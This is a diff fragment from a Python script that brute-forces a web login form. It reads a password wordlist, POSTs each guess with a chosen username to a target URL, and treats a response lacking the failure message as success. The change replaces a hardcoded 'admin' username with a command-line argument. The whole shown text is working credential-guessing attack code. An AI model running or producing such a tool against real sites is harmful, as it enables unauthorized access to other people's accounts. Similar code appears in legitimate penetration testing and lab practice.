@@ -62,7 +62,7 @@ def invalid(text):
 read_pass_file = open(args.password, "r")  # Read the file
 for line in read_pass_file:  # Read each line
     password = line.strip()
-    http = requests.post(args.target, data={user_parameter:"admin", pass_parameter:password, submit_parameter1:submit_parameter2})
+    http = requests.post(args.target, data={user_parameter:args.username, pass_parameter:password, submit_parameter1:submit_parameter2})  # Thanks Dark Daddy
     # See EDIT THIS at the begining of the file
     content = BeautifulSoup(http.content, "html.parser").get_text()  # Get the content
     if fail_message not in content:
